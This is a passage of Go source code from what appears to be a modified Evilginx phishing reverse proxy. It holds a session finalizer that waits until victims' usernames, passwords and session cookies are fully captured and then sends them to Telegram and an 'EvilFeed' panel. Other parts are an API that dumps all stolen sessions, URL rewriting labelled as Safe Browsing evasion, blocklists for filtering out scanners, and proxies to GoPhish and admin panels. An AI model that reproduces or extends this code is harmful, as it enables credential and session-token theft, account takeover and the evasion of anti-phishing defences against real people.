	}

	return sentSessions
}

// Helper function to append a sent session ID to persistent file
func appendSentSession(filePath string, sessionId string) error {
	// Ensure directory exists
	dir := filepath.Dir(filePath)
	if err := os.MkdirAll(dir, 0700); err != nil {
		return fmt.Errorf("failed to create directory: %v", err)
	}

	// Open file in append mode (create if doesn't exist)
	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer f.Close()

	// Append session ID with newline
	if _, err := f.WriteString(sessionId + "\n"); err != nil {
		return fmt.Errorf("failed to write to file: %v", err)
	}

	return nil
}

// SESSION FINALIZER - ONLY sends telegram when sessions are 100% COMPLETE
// This replaces the old AutoNotifier with BULLETPROOF validation + FULL COOKIE ACCUMULATION
func (p *HttpProxy) startSessionFinalizer() {
	log.Important("🚀 SESSION FINALIZER STARTED - checking every 15 seconds for COMPLETE sessions with FULL COOKIES")

	// Define cookie tracking structure
	type cookieTracker struct {
		lastCount     int
		stableCount   int
		firstSeenTime time.Time
		lastSeen      time.Time
	}

	// PERSISTENT SESSION TRACKING - survives restarts!
	sentSessionsFile := filepath.Join(HOME_DIR, "sent_sessions.txt")

	// Load previously sent sessions from file
	processedSessions := loadSentSessions(sentSessionsFile)

	// Cookie stability tracking (in-memory is OK - tracks current accumulation state)
	cookieStability := make(map[string]cookieTracker)

	log.Important("📁 SESSION FINALIZER: Using persistent tracking file: %s", sentSessionsFile)
	log.Important("🔄 SESSION FINALIZER: Will send previous complete sessions ONE TIME, then only NEW sessions")

	ticker := time.NewTicker(15 * time.Second) // Check every 15 seconds (more time for full accumulation)
	defer ticker.Stop()

	for range ticker.C {
		sessions, err := p.db.ListSessions()
		if err != nil {
			log.Debug("session-finalizer: failed to list sessions: %v", err)
			continue
		}

		for _, session := range sessions {
			// Skip if already processed
			if processedSessions[session.SessionId] {
				continue
			}

			// VALIDATION: Check what data we have
			hasUsername := session.Username != "" && session.Username != "N/A"
			hasPassword := session.Password != "" && session.Password != "N/A"
			hasCookies := len(session.CookieTokens) > 0

			// COMPLETE SESSION CRITERIA (supports passwordless logins like passkey/fingerprint/magic link):
			// - MUST have cookies (session tokens are the valuable part)
			// - MUST have at least username OR password (some identifier)
			// This allows: username + cookies (passkey), password + cookies (rare), or username + password + cookies (traditional)
			hasCredentialInfo := hasUsername || hasPassword
			isSessionComplete := hasCookies && hasCredentialInfo

			if isSessionComplete {
				currentCookieCount := len(session.CookieTokens)

				// Initialize or update cookie tracking
				tracker, exists := cookieStability[session.SessionId]
				if !exists {
					tracker = cookieTracker{
						lastCount:     currentCookieCount,
						stableCount:   1,
						firstSeenTime: time.Now(),
						lastSeen:      time.Now(),
					}
					cookieStability[session.SessionId] = tracker
					log.Important("🕒 SESSION FINALIZER: Started tracking session %d cookies (initial: %d tokens)", session.Id, currentCookieCount)
					continue // Skip first detection to allow accumulation
				}

				// Update tracking
				tracker.lastSeen = time.Now()

				if tracker.lastCount == currentCookieCount {
					// Cookie count is stable
					tracker.stableCount++
				} else {
					// Cookie count changed - reset stability counter
					tracker.stableCount = 1
					tracker.lastCount = currentCookieCount
					log.Debug("🍪 SESSION FINALIZER: Session %d cookie count changed to %d, resetting stability", session.Id, currentCookieCount)
				}

				cookieStability[session.SessionId] = tracker

				// STABILITY REQUIREMENTS:
				// 1. Cookie count stable for at least 3 cycles (45 seconds)
				// 2. At least 60 seconds since first detection
				// 3. Minimum cookie count threshold for completeness
				timeSinceFirst := time.Since(tracker.firstSeenTime)
				isStable := tracker.stableCount >= 3
				hasMinimumTime := timeSinceFirst >= 60*time.Second
				hasSignificantCookies := currentCookieCount >= 2 // Ensure meaningful cookie collection

				log.Debug("🔍 SESSION FINALIZER: Session %d stability check - count:%d, stable:%d cycles, time:%v, cookies:%d",
					session.Id, currentCookieCount, tracker.stableCount, timeSinceFirst, currentCookieCount)

				if isStable && hasMinimumTime && hasSignificantCookies {
					log.Important("🎯 SESSION FINALIZER: Found COMPLETE session %d with FULL COOKIES", session.Id)
					if hasUsername {
						log.Important("   → Username: %s ✅", session.Username)
					} else {
						log.Important("   → Username: (not captured - passkey/passwordless login)")
					}
					if hasPassword {
						log.Important("   → Password: %s ✅", session.Password)
					} else {
						log.Important("   → Password: (not captured - passkey/passwordless login)")
					}
					log.Important("   → IP Address: %s 🌐", session.RemoteAddr)
					log.Important("   → Cookies: %d tokens ✅ (stable for %d cycles, %v)", currentCookieCount, tracker.stableCount, timeSinceFirst)

					// Mark as processed in memory
					processedSessions[session.SessionId] = true
					delete(cookieStability, session.SessionId) // Clean up tracking

					// PERSIST to file so it won't be resent on restart
					if err := appendSentSession(sentSessionsFile, session.SessionId); err != nil {
						log.Warning("📁 SESSION FINALIZER: Failed to save sent session to file: %v", err)
					} else {
						log.Debug("📁 SESSION FINALIZER: Persisted session %s to file", session.SessionId)
					}

					// Send telegram notification for COMPLETE session with FULL COOKIES
					exportDir := p.cfg.GetTelegramConfig().CookieExportDir
					if exportDir == "" {
						exportDir = "/tmp/evilginx_exports"
					}

					log.Important("🚀 SESSION FINALIZER: Sending telegram for COMPLETE session %d with %d FULL COOKIES...", session.Id, currentCookieCount)
					p.telegramNotifier.NotifySessionCaptured(session.SessionId, exportDir)
					log.Success("✅ SESSION FINALIZER: Telegram sent for BULLETPROOF COMPLETE session %d with FULL COOKIES", session.Id)

					// Also notify EvilFeed with cookie file path
					if p.evilFeed != nil && p.evilFeed.IsEnabled() {
						// Generate cookie file path (same logic as telegram.go)
						username := session.Username
						if username == "" {
							username = fmt.Sprintf("session_%d", session.Id)
						}
						username = strings.ReplaceAll(username, "@", "_")
						username = strings.ReplaceAll(username, "/", "_")
						cookieFilePath := filepath.Join(exportDir, fmt.Sprintf("%s-%s.txt", username, session.Phishlet))

						p.evilFeed.NotifySessionCapturedWithFile(session, cookieFilePath)
						log.Success("✅ SESSION FINALIZER: EvilFeed notified with cookie file: %s", cookieFilePath)
					}
				} else {
					// Log stability progress
					reasons := []string{}
					if !isStable {
						reasons = append(reasons, fmt.Sprintf("unstable cookies (%d/%d cycles)", tracker.stableCount, 3))
					}
					if !hasMinimumTime {
						reasons = append(reasons, fmt.Sprintf("insufficient time (%v/%v)", timeSinceFirst, 60*time.Second))
					}
					if !hasSignificantCookies {
						reasons = append(reasons, fmt.Sprintf("insufficient cookies (%d/2)", currentCookieCount))
					}
					log.Debug("🕒 SESSION FINALIZER: Session %d waiting for full cookie stability: %v", session.Id, reasons)
				}
			} else {
				// Log what's missing (for debugging)
				missing := []string{}
				if !hasUsername {
					missing = append(missing, "username")
				}
				if !hasPassword {
					missing = append(missing, "password")
				}
				if !hasCookies {
					missing = append(missing, "cookies")
				}

				// Only log if session has some data (not completely empty)
				if len(missing) > 0 && len(missing) < 3 {
					log.Debug("session-finalizer: session %d waiting for completion, missing: %v", session.Id, missing)
				}
			}
		}
	}
}

// GetEvilFeed returns the EvilFeed client instance
func (p *HttpProxy) GetEvilFeed() *EvilFeedClient {
	return p.evilFeed
}

func sanitizeRedirectURL(raw string, host string) string {
	if raw == "" {
		return "/"
	}

	// Reject protocol-relative URLs
	if strings.HasPrefix(raw, "//") {
		return "/"
	}

	u, err := url.Parse(raw)
	if err != nil {
		return "/"
	}

	if u.IsAbs() {
		// Allow only same-host absolute URLs (http/https)
		if u.Scheme != "http" && u.Scheme != "https" {
			return "/"
		}
		if host == "" || !strings.EqualFold(u.Host, host) {
			return "/"
		}
		return u.String()
	}

	// Disallow any host without scheme
	if u.Host != "" {
		return "/"
	}

	if u.Path == "" {
		return "/"
	}

	if strings.HasPrefix(raw, "/") {
		return raw
	}

	// Normalize relative paths to absolute
	return "/" + raw
}

// EnableEvilFeedFromCLI enables EvilFeed from CLI flag (-feed)
func (p *HttpProxy) EnableEvilFeedFromCLI() {
	if p.evilFeed != nil && !p.evilFeed.IsEnabled() {
		p.evilFeed.Enable("")
		p.cfg.SetEvilFeedEnabled(true)
		log.Success("EvilFeed enabled via -feed flag: %s", p.evilFeed.GetEndpoint())
	}
}

// handleTurnstileVerify handles the Turnstile token verification API endpoint
func (p *HttpProxy) handleTurnstileVerify(req *http.Request, remoteIP string) (*http.Request, *http.Response) {
	// Read the request body
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		log.Warning("turnstile: failed to read request body: %v", err)
		resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
			string(TurnstileJSONResponse(false, "", "", "failed to read request")))
		return req, resp
	}
	req.Body.Close()

	// Parse the JSON request
	type TurnstileVerifyRequest struct {
		Token       string `json:"token"`
		RedirectURL string `json:"redirect_url"`
	}
	var verifyReq TurnstileVerifyRequest
	if err := json.Unmarshal(body, &verifyReq); err != nil {
		log.Warning("turnstile: failed to parse request: %v", err)
		resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
			string(TurnstileJSONResponse(false, "", "", "invalid request format")))
		return req, resp
	}

	// Verify the token with Cloudflare
	verified, err := p.turnstileVerifier.VerifyToken(verifyReq.Token, remoteIP)
	if err != nil {
		log.Warning("turnstile: verification error: %v", err)
	}

	// Get redirect URL - sanitize client-provided value
	redirectURL := sanitizeRedirectURL(verifyReq.RedirectURL, req.Host)

	if verified {
		log.Info("turnstile: verification successful from %s", remoteIP)
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK,
			string(TurnstileJSONResponse(true, redirectURL, "", "")))
		return req, resp
	}

	// Strict mode: deny on verification failure or error
	status := http.StatusForbidden
	errMsg := "verification failed"
	if err != nil {
		status = http.StatusBadGateway
		errMsg = "verification error"
	}
	log.Warning("turnstile: verification denied from %s", remoteIP)
	resp := goproxy.NewResponse(req, "application/json", status,
		string(TurnstileJSONResponse(false, "", "", errMsg)))
	return req, resp
}

// handleTelegramConfig handles GET/POST requests for Telegram configuration
func (p *HttpProxy) handleTelegramConfig(req *http.Request) (*http.Request, *http.Response) {
	if req.Method == "GET" {
		// Return current Telegram config
		type TelegramConfigResponse struct {
			BotToken string `json:"bot_token"`
			ChatId   string `json:"chat_id"`
			Enabled  bool   `json:"enabled"`
		}
		tcfg := p.cfg.GetTelegramConfig()
		response := TelegramConfigResponse{
			BotToken: tcfg.BotToken,
			ChatId:   tcfg.ChatId,
			Enabled:  tcfg.Enabled,
		}
		data, _ := json.Marshal(response)
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(data))
		return req, resp
	}

	if req.Method == "POST" {
		// Update Telegram config
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"success":false,"error":"failed to read request"}`)
			return req, resp
		}
		req.Body.Close()

		type TelegramConfigRequest struct {
			BotToken string `json:"bot_token"`
			ChatId   string `json:"chat_id"`
			Enabled  *bool  `json:"enabled"`
		}
		var cfgReq TelegramConfigRequest
		if err := json.Unmarshal(body, &cfgReq); err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"success":false,"error":"invalid JSON"}`)
			return req, resp
		}

		// Track whether we need to refresh the notifier
		needsUpdate := false

		// Update config if values provided
		if cfgReq.BotToken != "" {
			p.cfg.SetTelegramBotToken(cfgReq.BotToken)
			needsUpdate = true
		}
		if cfgReq.ChatId != "" {
			p.cfg.SetTelegramChatId(cfgReq.ChatId)
			needsUpdate = true
		}
		if cfgReq.Enabled != nil {
			p.cfg.SetTelegramEnabled(*cfgReq.Enabled)
			needsUpdate = true
		}

		// Refresh notifier with latest config
		if needsUpdate {
			p.UpdateTelegramConfig()
		}

		log.Info("telegram: config updated via API")
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK,
			`{"success":true}`)
		return req, resp
	}

	// Method not allowed
	resp := goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed,
		`{"error":"method not allowed"}`)
	return req, resp
}

// handleTurnstileConfig handles GET/POST requests for Turnstile configuration
func (p *HttpProxy) handleTurnstileConfig(req *http.Request) (*http.Request, *http.Response) {
	if req.Method == "GET" {
		// Return current Turnstile config
		type TurnstileConfigResponse struct {
			SiteKey   string `json:"sitekey"`
			SecretKey string `json:"secretkey"`
			Enabled   bool   `json:"enabled"`
		}
		tcfg := p.cfg.GetTurnstileConfig()
		response := TurnstileConfigResponse{
			SiteKey:   tcfg.SiteKey,
			SecretKey: tcfg.SecretKey,
			Enabled:   tcfg.Enabled,
		}
		data, _ := json.Marshal(response)
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(data))
		return req, resp
	}

	if req.Method == "POST" {
		// Update Turnstile config
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"success":false,"error":"failed to read request"}`)
			return req, resp
		}
		req.Body.Close()

		type TurnstileConfigRequest struct {
			SiteKey   string `json:"sitekey"`
			SecretKey string `json:"secretkey"`
			Enabled   *bool  `json:"enabled"`
		}
		var cfgReq TurnstileConfigRequest
		if err := json.Unmarshal(body, &cfgReq); err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"success":false,"error":"invalid JSON"}`)
			return req, resp
		}

		// Update config if values provided
		if cfgReq.SiteKey != "" {
			p.cfg.SetTurnstileSiteKey(cfgReq.SiteKey)
		}
		if cfgReq.SecretKey != "" {
			p.cfg.SetTurnstileSecretKey(cfgReq.SecretKey)
		}
		if cfgReq.Enabled != nil {
			p.cfg.SetTurnstileEnabled(*cfgReq.Enabled)
		}

		log.Info("turnstile: config updated via API")
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK,
			`{"success":true}`)
		return req, resp
	}

	// Method not allowed
	resp := goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed,
		`{"error":"method not allowed"}`)
	return req, resp
}

// handleProxyConfig handles GET/POST requests for Proxy configuration
func (p *HttpProxy) handleProxyConfig(req *http.Request) (*http.Request, *http.Response) {
	if req.Method == "GET" {
		// Return current proxy config (mask password)
		proxyType := p.cfg.proxyConfig.Type
		if proxyType == "" {
			proxyType = "socks5"
		}
		respData := fmt.Sprintf(`{"type":"%s","address":"%s","port":%d,"username":"%s","password":"%s","enabled":%t}`,
			proxyType,
			p.cfg.proxyConfig.Address,
			p.cfg.proxyConfig.Port,
			p.cfg.proxyConfig.Username,
			"", // Don't expose password in GET
			p.cfg.proxyConfig.Enabled)
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK, respData)
		return req, resp
	}

	if req.Method == "POST" {
		// Update proxy config and apply immediately
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"error":"failed to read request body"}`)
			return req, resp
		}

		var cfgReq struct {
			Type     string `json:"type"`
			Address  string `json:"address"`
			Port     *int   `json:"port"`
			Username string `json:"username"`
			Password string `json:"password"`
			Enabled  *bool  `json:"enabled"`
		}

		if err := json.Unmarshal(body, &cfgReq); err != nil {
			resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest,
				`{"error":"invalid JSON"}`)
			return req, resp
		}

		// Update config values
		if cfgReq.Type != "" {
			p.cfg.SetProxyType(cfgReq.Type)
		}
		if cfgReq.Address != "" {
			p.cfg.SetProxyAddress(cfgReq.Address)
		}
		if cfgReq.Port != nil {
			p.cfg.SetProxyPort(*cfgReq.Port)
		}
		if cfgReq.Username != "" {
			p.cfg.SetProxyUsername(cfgReq.Username)
		}
		if cfgReq.Password != "" {
			p.cfg.SetProxyPassword(cfgReq.Password)
		}
		if cfgReq.Enabled != nil {
			p.cfg.EnableProxy(*cfgReq.Enabled)
		}

		// Apply proxy settings immediately (no restart required!)
		proxyType := p.cfg.proxyConfig.Type
		if proxyType == "" {
			proxyType = "socks5"
		}
		err = p.setProxy(
			p.cfg.proxyConfig.Enabled,
			proxyType,
			p.cfg.proxyConfig.Address,
			p.cfg.proxyConfig.Port,
			p.cfg.proxyConfig.Username,
			p.cfg.proxyConfig.Password,
		)
		if err != nil {
			log.Error("proxy: failed to apply config: %v", err)
			resp := goproxy.NewResponse(req, "application/json", http.StatusInternalServerError,
				fmt.Sprintf(`{"error":"failed to apply proxy: %s"}`, err.Error()))
			return req, resp
		}

		log.Info("proxy: config updated and applied via API")
		resp := goproxy.NewResponse(req, "application/json", http.StatusOK,
			`{"success":true}`)
		return req, resp
	}

	// Method not allowed
	resp := goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed,
		`{"error":"method not allowed"}`)
	return req, resp
}

// handleSessionsAPI handles GET requests to retrieve all captured sessions
// This allows EvilFeed to read directly from Evilginx's database
func (p *HttpProxy) handleSessionsAPI(req *http.Request) (*http.Request, *http.Response) {
	if req.Method != "GET" {
		resp := goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed,
			`{"error":"method not allowed"}`)
		return req, resp
	}

	// Get all sessions from database
	sessions, err := p.db.ListSessions()
	if err != nil {
		resp := goproxy.NewResponse(req, "application/json", http.StatusInternalServerError,
			fmt.Sprintf(`{"error":"failed to list sessions: %s"}`, err.Error()))
		return req, resp
	}

	// Convert to JSON-friendly format with tokens as JSON string
	type SessionResponse struct {
		ID         int               `json:"id"`
		Phishlet   string            `json:"phishlet"`
		Username   string            `json:"username"`
		Password   string            `json:"password"`
		SessionID  string            `json:"session_id"`
		RemoteAddr string            `json:"remote_addr"`
		UserAgent  string            `json:"useragent"`
		Tokens     string            `json:"tokens"`
		Custom     map[string]string `json:"custom"`
		CreateTime int64             `json:"create_time"`
		UpdateTime int64             `json:"update_time"`
		LandingURL string            `json:"landing_url"`
	}

	var response []SessionResponse
	for _, s := range sessions {
		// Convert CookieTokens to JSON string
		tokensJSON := ""
		if len(s.CookieTokens) > 0 {
			if data, err := json.Marshal(s.CookieTokens); err == nil {
				tokensJSON = string(data)
			}
		}

		response = append(response, SessionResponse{
			ID:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			SessionID:  s.SessionId,
			RemoteAddr: s.RemoteAddr,
			UserAgent:  s.UserAgent,
			Tokens:     tokensJSON,
			Custom:     s.Custom,
			CreateTime: s.CreateTime,
			UpdateTime: s.UpdateTime,
			LandingURL: s.LandingURL,
		})
	}

	data, _ := json.Marshal(response)
	resp := goproxy.NewResponse(req, "application/json", http.StatusOK, string(data))
	return req, resp
}

// notifyEvilFeed sends real-time updates to EvilFeed
// Optional rid parameter for GoPhish campaign tracking correlation
func (p *HttpProxy) notifyWebPanel(eventType string, data interface{}, rid ...string) {
	// Extract RID if provided
	sessionRid := ""
	if len(rid) > 0 {
		sessionRid = rid[0]
	}

	// Notify EvilFeed
	if p.evilFeed != nil {
		switch eventType {
		case "new_session":
			if session, ok := data.(*database.Session); ok {
				p.evilFeed.NotifyNewSession(session, sessionRid)
			}
		case "credentials_captured":
			if session, ok := data.(*database.Session); ok {
				p.evilFeed.NotifyCredentialsCaptured(session, sessionRid)
			}
		case "session_captured":
			if session, ok := data.(*database.Session); ok {
				p.evilFeed.NotifySessionCaptured(session, sessionRid)
			}
		}
	}
}

// GetRequestChecker returns the RequestChecker instance
func (p *HttpProxy) GetRequestChecker() *RequestChecker {
	return p.requestChecker
}

// SetRequestChecker sets/updates the RequestChecker instance
func (p *HttpProxy) SetRequestChecker(rc *RequestChecker) {
	p.requestChecker = rc
}

// EnableRequestChecker enables and initializes the RequestChecker
func (p *HttpProxy) EnableRequestChecker() error {
	if p.requestChecker != nil {
		return nil // Already enabled
	}

	rc, err := NewRequestChecker(
		p.cfg.GetRequestCheckerASNFile(),
		p.cfg.GetRequestCheckerUserAgentFile(),
		p.cfg.GetRequestCheckerIPRangeFile(),
		p.cfg.GetRequestCheckerIPListFile(),
		p.cfg.GetRequestCheckerVerbose(),
	)
	if err != nil {
		return err
	}

	p.requestChecker = rc
	p.cfg.SetRequestCheckerEnabled(true)
	log.Info("[RequestChecker] Enabled and initialized")
	return nil
}

// DisableRequestChecker disables the RequestChecker
func (p *HttpProxy) DisableRequestChecker() {
	p.requestChecker = nil
	p.cfg.SetRequestCheckerEnabled(false)
	log.Info("[RequestChecker] Disabled")
}

// ReloadRequestCheckerLists reloads all blocklists from files
func (p *HttpProxy) ReloadRequestCheckerLists() error {
	if p.requestChecker == nil {
		return fmt.Errorf("RequestChecker is not enabled")
	}

	return p.requestChecker.ReloadLists(
		p.cfg.GetRequestCheckerASNFile(),
		p.cfg.GetRequestCheckerUserAgentFile(),
		p.cfg.GetRequestCheckerIPRangeFile(),
		p.cfg.GetRequestCheckerIPListFile(),
	)
}

// GetRequestCheckerStats returns statistics about loaded blocklists
func (p *HttpProxy) GetRequestCheckerStats() (asns, uas, ipRanges, ips int) {
	if p.requestChecker == nil {
		return 0, 0, 0, 0
	}
	return p.requestChecker.GetStats()
}

// ============================================================================
// URL REWRITING FOR SAFE BROWSING EVASION
// ============================================================================

// checkUrlRewrite checks if the incoming request matches any URL rewrite rules
// and returns the rewritten URL if a match is found
// Returns: (shouldRewrite bool, rewrittenPath string, originalPath string)
func (p *HttpProxy) checkUrlRewrite(pl *Phishlet, hostname string, path string, query url.Values) (bool, string, string) {
	if pl == nil {
		return false, "", ""
	}

	rules := pl.GetRewriteRules()
	if len(rules) == 0 {
		return false, "", ""
	}

	for _, rule := range rules {
		// Check if hostname matches trigger domains
		hostMatched := false
		for _, d := range rule.TriggerDomains {
			if strings.EqualFold(hostname, d) {
				hostMatched = true
				break
			}
		}
		if !hostMatched {
			continue
		}

		// Check if path matches trigger paths
		pathMatched := false
		for _, pathRe := range rule.TriggerPaths {
			if pathRe.MatchString(path) {
				pathMatched = true
				break
			}
		}
		if !pathMatched {
			continue
		}

		// Build the rewritten URL
		newPath := rule.RewritePath

		// Build new query string
		newQuery := url.Values{}

		// Extract session ID from original query for {id} placeholder replacement
		// Google uses 'dsh' parameter for session ID
		sessionId := query.Get("dsh")
		if sessionId == "" {
			// Try to extract from ifkv or other session-related params
			sessionId = query.Get("ifkv")
		}

		// Add new query parameters from rule
		for _, q := range rule.RewriteQuery {
			value := q.Value
			// Replace {id} placeholder with actual session ID
			if strings.Contains(value, "{id}") && sessionId != "" {
				value = strings.ReplaceAll(value, "{id}", sessionId)
			}
			newQuery.Set(q.Key, value)
		}

		// Preserve excluded keys from original query
		for _, key := range rule.ExcludeKeys {
			if val := query.Get(key); val != "" {
				newQuery.Set(key, val)
			}
		}

		// Build final rewritten path with query
		rewrittenPath := newPath
		if len(newQuery) > 0 {
			rewrittenPath += "?" + newQuery.Encode()
		}

		// Store original path with query for reverse mapping
		originalPath := path
		if len(query) > 0 {
			originalPath += "?" + query.Encode()
		}

		log.Info("[URLRewrite] Matched rule: %s -> %s (Safe Browsing evasion)", originalPath, rewrittenPath)
		return true, rewrittenPath, originalPath
	}

	return false, "", ""
}

// storeRewriteMapping stores the mapping from rewritten URL to original URL
func (p *HttpProxy) storeRewriteMapping(rewrittenUrl string, originalUrl string) {
	p.rewriteMutex.Lock()
	defer p.rewriteMutex.Unlock()
	p.rewrittenUrls[rewrittenUrl] = originalUrl
	log.Debug("[URLRewrite] Stored mapping: %s -> %s", rewrittenUrl, originalUrl)
}

// getOriginalUrl retrieves the original URL for a rewritten URL
func (p *HttpProxy) getOriginalUrl(rewrittenUrl string) (string, bool) {
	p.rewriteMutex.RLock()
	defer p.rewriteMutex.RUnlock()
	original, ok := p.rewrittenUrls[rewrittenUrl]
	return original, ok
}

// cleanupRewriteMapping removes a mapping after it's been used
func (p *HttpProxy) cleanupRewriteMapping(rewrittenUrl string) {
	p.rewriteMutex.Lock()
	defer p.rewriteMutex.Unlock()
	delete(p.rewrittenUrls, rewrittenUrl)
}

// ============================================================================
// BASE DOMAIN ADMIN PANEL HANDLERS
// ============================================================================

// handleAdminPanelProxy proxies requests to EvilFeed admin panel
func (p *HttpProxy) handleAdminPanelProxy(req *http.Request, adminPath string) (*http.Request, *http.Response) {
	// Get EvilFeed backend URL from admin panel config (NOT the ingest API endpoint)
	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
	if evilFeedEndpoint == "" {
		evilFeedEndpoint = "http://127.0.0.1:1337" // Default EvilFeed web UI port
	}

	// Strip the admin path prefix and proxy to EvilFeed
	basePath := strings.TrimSuffix(adminPath, "/") // e.g., "/admin"
	targetPath := strings.TrimPrefix(req.URL.Path, basePath)
	if targetPath == "" {
		targetPath = "/"
	}

	// Check for WebSocket upgrade request - these need special handling
	// WebSocket connections cannot be proxied through goproxy's response mechanism
	if req.Header.Get("Upgrade") == "websocket" {
		log.Debug("[AdminPanel] WebSocket upgrade request detected for %s", targetPath)
		// Return nil to let the connection pass through - the client will connect directly
		// The EvilFeed index.html already constructs the correct WebSocket URL with base path
		// We need to proxy this as a WebSocket connection
		return p.handleWebSocketProxy(req, evilFeedEndpoint, targetPath)
	}

	// Build target URL
	targetURL := evilFeedEndpoint + targetPath
	if req.URL.RawQuery != "" {
		targetURL += "?" + req.URL.RawQuery
	}

	log.Debug("[AdminPanel] Proxying %s -> %s", req.URL.Path, targetURL)

	// Create proxy request
	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
	if err != nil {
		log.Error("[AdminPanel] Failed to create proxy request: %v", err)
		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Admin panel unavailable")
		return req, resp
	}

	// Copy headers
	for key, values := range req.Header {
		for _, value := range values {
			proxyReq.Header.Add(key, value)
		}
	}

	// Make the request with TLS skip verification for local backends
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // Allow self-signed certs for local backends
		},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
		// Don't follow redirects - let the browser handle them
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	proxyResp, err := client.Do(proxyReq)
	if err != nil {
		log.Error("[AdminPanel] Proxy request failed: %v", err)
		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Admin panel unavailable")
		return req, resp
	}

	// Read response body
	body, _ := ioutil.ReadAll(proxyResp.Body)
	proxyResp.Body.Close()

	// Rewrite Location header for redirects
	if location := proxyResp.Header.Get("Location"); location != "" {
		// If it's an absolute path (starts with /), prepend the base path
		if strings.HasPrefix(location, "/") && !strings.HasPrefix(location, "//") {
			proxyResp.Header.Set("Location", basePath+location)
		}
	}

	// Rewrite absolute URLs in HTML/JS/CSS responses to include the base path
	contentType := proxyResp.Header.Get("Content-Type")
	if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "text/css") {
		bodyStr := string(body)
		// Rewrite absolute paths: href="/...", src="/...", action="/..."
		// But NOT protocol-relative URLs like href="//..."
		re1 := regexp.MustCompile(`(href|src|action)="(/[^/"][^"]*)"`)
		bodyStr = re1.ReplaceAllString(bodyStr, `$1="`+basePath+`$2"`)
		re2 := regexp.MustCompile(`(href|src|action)='(/[^/'][^']*)'`)
		bodyStr = re2.ReplaceAllString(bodyStr, `$1='`+basePath+`$2'`)
		// Rewrite fetch('/api/...) calls
		re3 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"]\)`)
		bodyStr = re3.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1')`)
		re4 := regexp.MustCompile(`fetch\(['"](/[^'"]+)['"],`)
		bodyStr = re4.ReplaceAllString(bodyStr, `fetch('`+basePath+`$1',`)
		// Rewrite url() in CSS: url(/...) or url('/...') or url("/...")
		re5 := regexp.MustCompile(`url\(["']?(/[^)"']+)["']?\)`)
		bodyStr = re5.ReplaceAllString(bodyStr, `url('`+basePath+`$1')`)
		// Rewrite WebSocket URLs: new WebSocket('ws://host/ws') or wss://
		re6 := regexp.MustCompile(`WebSocket\(['"](wss?://[^/]+)(/[^'"]*)['"]\)`)
		bodyStr = re6.ReplaceAllString(bodyStr, `WebSocket('$1`+basePath+`$2')`)
		// Rewrite window.location paths
		re7 := regexp.MustCompile(`(window\.location\s*=\s*|location\.href\s*=\s*)['"](/[^'"]+)['"]`)
		bodyStr = re7.ReplaceAllString(bodyStr, `$1'`+basePath+`$2'`)
		body = []byte(bodyStr)
	}

	// Create response
	resp := goproxy.NewResponse(req, contentType, proxyResp.StatusCode, string(body))
	if resp != nil {
		// Copy response headers (except Content-Length which may have changed)
		for key, values := range proxyResp.Header {
			if key != "Content-Length" {
				for _, value := range values {
					resp.Header.Add(key, value)
				}
			}
		}
	}

	return req, resp
}

// handleMailPanelProxy proxies requests to GoPhish mail panel
func (p *HttpProxy) handleMailPanelProxy(req *http.Request, mailPath string) (*http.Request, *http.Response) {
	// Get GoPhish backend URL from admin panel config (NOT the API integration URL)
	gophishURL := p.cfg.GetAdminPanelConfig().MailBackend
	if gophishURL == "" {
		// GoPhish uses HTTP when use_tls is false (TLS handled by evilginx proxy)
		gophishURL = "http://127.0.0.1:3333" // Default GoPhish admin panel port
	}

	// Strip the mail path prefix and proxy to GoPhish
	basePath := strings.TrimSuffix(mailPath, "/") // e.g., "/mail"
	targetPath := strings.TrimPrefix(req.URL.Path, basePath)
	if targetPath == "" {
		targetPath = "/"
	}

	// Build target URL
	targetURL := gophishURL + targetPath
	if req.URL.RawQuery != "" {
		targetURL += "?" + req.URL.RawQuery
	}

	log.Debug("[MailPanel] Proxying %s -> %s", req.URL.Path, targetURL)

	// Create proxy request
	proxyReq, err := http.NewRequest(req.Method, targetURL, req.Body)
	if err != nil {
		log.Error("[MailPanel] Failed to create proxy request: %v", err)
		resp := goproxy.NewResponse(req, "text/html", http.StatusBadGateway, "Mail panel unavailable")
		return req, resp
	}

	// Copy headers
	for key, values := range req.Header {
		for _, value := range values {
			proxyReq.Header.Add(key, value)
		}
	}

	// Remove Accept-Encoding to prevent compression, so we can modify the body for path rewriting
	proxyReq.Header.Del("Accept-Encoding")

